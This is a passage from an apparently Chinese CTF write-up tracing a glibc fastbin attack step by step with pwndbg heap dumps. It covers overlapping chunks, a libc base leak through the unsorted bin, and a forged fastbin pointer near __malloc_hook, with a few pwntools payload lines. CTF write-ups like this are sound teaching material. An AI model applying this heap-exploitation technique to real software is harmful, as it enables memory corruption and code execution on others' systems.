0x0000000000000000</span><br></pre></td></tr></table></figure>
<blockquote>
<p>修改成功，但是由于chunk4的大小修改了，故找不到top chunk了，故后期需要把大小：0x10-&gt;0x80</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x5614ee1f6080</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f60a0</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>
<blockquote>
<p>通过溢出，成功修改了chunk2指向chunk4，导致未释放的chunk4加入到了bin中，重新allocate，导致idx=2、4都为同一个块。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x555923ab8040 —▸ 0x555923ab8080 ◂— 0x21 &#x2F;* &#39;!&#39; *&#x2F;</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<h4 id="6-重新申请回两个块"><a href="#6-重新申请回两个块" class="headerlink" title="6.重新申请回两个块"></a>6.重新申请回两个块</h4><blockquote>
<p>1、2、4</p>
<p>释放：块1-&gt;块2</p>
<p>修改：块2-&gt;块4</p>
<p>重新申请：块4-&gt;块2（idx1-&gt;idx2）</p>
<p>故</p>
<ul>
<li>原块1直接释放态-&gt;allocate态</li>
<li>原块2-&gt;idx1</li>
<li>原块4-&gt;idx2</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#先进后出</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f60a0</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f60a0</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>
<h4 id="7-重新修改chunk4：0x10-gt-0x80"><a href="#7-重新修改chunk4：0x10-gt-0x80" class="headerlink" title="7.重新修改chunk4：0x10-&gt;0x80"></a>7.重新修改chunk4：0x10-&gt;0x80</h4><blockquote>
<p>为了让top chunk重新找得到，故需要重新讲chunk4的大小修改回0x80，以便于之后申请操作。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">#0</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line">#1</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line">#new 1</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line">#3</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line">#2、4</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x20ef1</span><br></pre></td></tr></table></figure>
<h4 id="8-申请一个块，防止块4free与top-chunk合并"><a href="#8-申请一个块，防止块4free与top-chunk合并" class="headerlink" title="8.申请一个块，防止块4free与top chunk合并"></a>8.申请一个块，防止块4free与top chunk合并</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">#alloc(0x80)</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br></pre></td></tr></table></figure>
<h4 id="9-释放chunk4"><a href="#9-释放chunk4" class="headerlink" title="9.释放chunk4"></a>9.释放chunk4</h4><blockquote>
<p>因为此时idx2、4都指向chunk4，故可以释放chunk4，此时它里面会填入main_arena中地址，可以计算得到libc_base</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#free(4)</span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br></pre></td></tr></table></figure>
<h4 id="10-打印idx2-即idx4内容"><a href="#10-打印idx2-即idx4内容" class="headerlink" title="10.打印idx2(即idx4内容)"></a>10.打印idx2(即idx4内容)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc_base &#x3D; u64(dump(2)[:8].strip().ljust(8, &quot;\x00&quot;))-0x3c4b78</span><br><span class="line">log.info(&quot;libc_base: &quot;+hex(libc_base))</span><br></pre></td></tr></table></figure>
<h4 id="11-申请0x60的块"><a href="#11-申请0x60的块" class="headerlink" title="11.申请0x60的块"></a>11.申请0x60的块</h4><blockquote>
<p>新块的idx为4（把idx4给了分配的块，为分配的0x21没有idx）</p>
<p>切割0x91的块，剩下0x21放入了unsortedbin中</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#alloc(0x60)</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x71</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f60f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br></pre></td></tr></table></figure>
<h4 id="12-释放0x60的块"><a href="#12-释放0x60的块" class="headerlink" title="12.释放0x60的块"></a>12.释放0x60的块</h4><blockquote>
<p>再次释放0x60的块，放入了fastbin中，为fastbin后面继续申请0x60的堆地址提供了帮助，，，</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#free(4)</span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f60f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br></pre></td></tr></table></figure>
<h4 id="13-修改idx2的内容，为malloc-hook附近构造chunk的地址"><a href="#13-修改idx2的内容，为malloc-hook附近构造chunk的地址" class="headerlink" title="13.修改idx2的内容，为malloc_hook附近构造chunk的地址"></a>13.修改idx2的内容，为malloc_hook附近构造chunk的地址</h4><blockquote>
<p>需要改地址，有fastbin大小的八字节数字，，，</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#payload &#x3D; p64(libc_base+0x3c4aed)</span><br><span class="line">#fill(2, payload)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x5614ee1f6090:	0x00007f6a86e67aed	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x7f6a86e67aed#修改后的地址</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f60f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">#接下来申请两遍，即可得到0x7f6a86e67aed地址的块，可以对0x7f6a86e67aed进行数据读写</span><br><span class="line">0x70: 0x5614ee1f6080 —▸ 0x7f6a86e67aed (_IO_wide_data_0+301) ◂— 0x6a86b28ea0000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5614ee1f60f0 —▸ 0x7f6a86e67b78 (main_arena+88) ◂— 0x5614ee1f60f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<h4 id="14-申请回第一个0x60块"><a href="#14-申请回第一个0x60块" class="headerlink" title="14.申请回第一个0x60块"></a>14.申请回第一个0x60块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#alloc(0x60)</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x71</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f60f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x7f6a86e67aed (_IO_wide_data_0+301) ◂— 0x6a86b28ea0000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 